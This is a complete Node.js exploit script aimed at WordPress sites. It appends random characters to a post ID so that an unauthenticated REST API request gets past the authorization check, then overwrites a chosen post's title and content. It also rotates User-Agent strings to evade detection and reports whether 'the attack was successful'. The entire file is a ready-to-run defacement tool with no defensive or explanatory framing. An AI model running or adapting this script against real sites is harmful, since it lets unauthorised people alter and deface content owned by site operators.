const cmd = require('command-line-args');
const request = require('request');
const randomUA = require('random-ua');

const optionDefinitions = [
    { name: 'site', alias: 's', type: String },
    { name: 'postId', alias: 'i', type: String },
    { name: 'postTitle', alias: 't', type: String },
    { name: 'postContent', alias: 'c', type: String }
];
const randomChars = (length = 8) => {
    let text = "";
    let possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (let i = 0; i < length; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return text;
};
let params = cmd(optionDefinitions);
let requestOptions = {
    url: `http://${params['site']}/index.php/wp-json/wp/v2/posts/${params['postId']}`,
    headers: { 'User-Agent': randomUA.generate() },
    method: 'POST',
    body: JSON.stringify({
        id: params['postId'] + randomChars(),
        title: params['postTitle'],
        content: params['postContent']
    })
};
request(requestOptions.url, requestOptions,
    (err, response, body) => {
        if (!err) {
            console.log(body);
            switch (response.statusCode) {
                case 200:
                    console.log(`Payload sent to ${params['site']} with 200 status`);
                    break;
                default:
                    console.log(`Payload sent to ${params['site']}, but we are not sure if the attack was successful as ${response.statusCode} was the response`);
                    break;
            }
        } else {
            console.log('Internal error', err);
        }
    });